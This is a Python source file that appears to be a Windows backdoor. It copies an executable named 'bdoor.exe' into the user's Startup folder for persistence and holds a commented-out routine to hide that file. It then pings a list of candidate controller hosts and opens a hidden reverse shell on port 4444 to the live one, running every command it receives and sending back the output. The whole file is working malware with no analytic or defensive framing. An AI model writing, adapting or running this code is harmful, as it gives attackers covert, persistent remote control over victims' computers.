import socket
import subprocess
import os


def m_f():
    # Define the source file and the Startup folder
    source = 'bdoor.exe'
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Construct the command
    command = f'copy {source} "{startup_folder}"'

    try:
        # Execute the command
        subprocess.run(command, check=True, shell=True, text=True)
    except:
        pass


# Call the function
m_f()



# def hide_file_windows(file_path):
#     subprocess.run(['attrib', '+h', file_path])
# hide_file_windows('bdoor.exe')




hosts = [
    "dwafwafwa.xyz",
    "example.com",
    "attackerhost.example",
    "etc.example",
    "deadhost.tld",
    "alivehost.tld"
]

#check the alive host
def check_alive(host):
    try:
        result = subprocess.run(["ping", "-n", "2", host], creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return result.returncode == 0
    except:
        return False

conip = ""
for host in hosts:
    if check_alive(host):
        conip = host
    else:
        pass

#connect to this port on the alive host
conport = 4444


#establish connection
def soc_connection():   

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:

        s.connect((conip, conport))
        
        while True:

            command = s.recv(1024).decode()
            
            if 'exit' in command:
                break
            elif 'cd' in command:
                try:
                    os.chdir(command[3:].strip())
                    s.send(b"Change directory to " + os.getcwd().encode())
                except Exception as cd_error:
                    s.send(str(cd_error).encode())
            

            output = subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_str = output.stdout.read() + output.stderr.read()
            s.send(output_str)
    except Exception as e:
        pass
        #or ....
    

    s.close()





if __name__ == "__main__":
    soc_connection()
